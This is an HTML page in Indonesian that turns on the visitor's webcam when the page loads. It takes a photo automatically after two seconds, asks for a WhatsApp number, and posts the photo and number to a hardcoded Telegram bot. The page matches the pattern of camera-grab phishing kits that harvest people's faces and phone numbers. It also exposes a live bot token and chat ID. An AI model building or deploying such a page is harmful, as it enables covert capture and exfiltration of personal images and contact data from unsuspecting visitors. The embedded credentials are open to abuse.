<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Auto Ambil Foto & Kirim ke Telegram</title>
</head>
<body>
  <h2 id="status">Memuat kamera...</h2>
  <video id="video" width="300" autoplay playsinline></video>
  <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

  <div id="formContainer" style="display:none;">
    <h3>Masukkan Nomor WhatsApp</h3>
    <input type="text" id="waNumber" placeholder="Contoh: 6281234567890">
    <button id="send">Kirim ke Telegram</button>
  </div>

  <script>
    const status = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    let imageBlob = null;

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          status.textContent = "Mengambil foto...";
          setTimeout(() => {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
              imageBlob = blob;
              status.textContent = "Foto berhasil diambil!";
              document.getElementById('formContainer').style.display = 'block';
            }, 'image/jpeg');
          }, 2000); // Tunggu 2 detik sebelum ambil foto
        };
      } catch (err) {
        status.textContent = "Gagal mengakses kamera. Pastikan kamu memberikan izin dan menggunakan HTTPS atau localhost.";
        console.error("Kamera error:", err);
      }
    }

    startCamera();

    // Kirim ke Telegram saat tombol ditekan
    document.getElementById('send').addEventListener('click', () => {
      const waNumber = document.getElementById('waNumber').value.trim();
      if (!waNumber || !imageBlob) {
        alert("Masukkan nomor WhatsApp dan pastikan foto berhasil diambil.");
        return;
      }

      const formData = new FormData();
      formData.append('chat_id', '7041008009');
      formData.append('caption', 'Nomor WhatsApp: ' + waNumber);
      formData.append('photo', imageBlob, 'photo.jpg');

      fetch('https://api.telegram.org/bot7548364986:AAGhIDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY/sendPhoto', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        alert("Foto dan nomor berhasil dikirim ke Telegram!");
      })
      .catch(error => {
        alert("Gagal mengirim ke Telegram: " + error);
        console.error("Telegram error:", error);
      });
    });
  </script>
</body>
</html>
